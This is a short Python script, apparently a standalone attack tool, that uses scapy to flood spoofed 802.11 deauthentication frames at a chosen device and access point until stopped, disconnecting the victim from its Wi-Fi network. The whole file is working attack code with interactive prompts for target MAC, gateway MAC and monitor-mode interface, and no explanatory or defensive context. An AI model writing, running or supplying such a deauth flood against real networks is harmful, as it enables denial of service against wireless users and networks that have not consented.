import sys
import time
try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
except ImportError:
    print("bilgilendirme: 'scapy' kütüpheasnei gerekir")
    sys.exit()

print("X" * 60)
print("       WIRELESS DEAUTHENTICATION (NETWORK DISCONNECT)")
print("X" * 60)

target_mac = input("\n[?] Enter Target Device MAC: ")
gateway_mac = input("[?] Enter Access Point MAC: ")
interface = input("[?] Enter Network Interface (e.g., wlan0mon): ")

print(f"\n[*] Starting deauth flood on {target_mac}...")
time.sleep(1)

dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
packet = RadioTap()/dot11/Dot11Deauth(reason=7)

try:
    while True:
        sendp(packet, iface=interface, count=100, inter=0.1, verbose=False)
        print(f"\r[!] Sending deauth frames...", end="")
except KeyboardInterrupt:
    print("\n[-] Attack terminated.")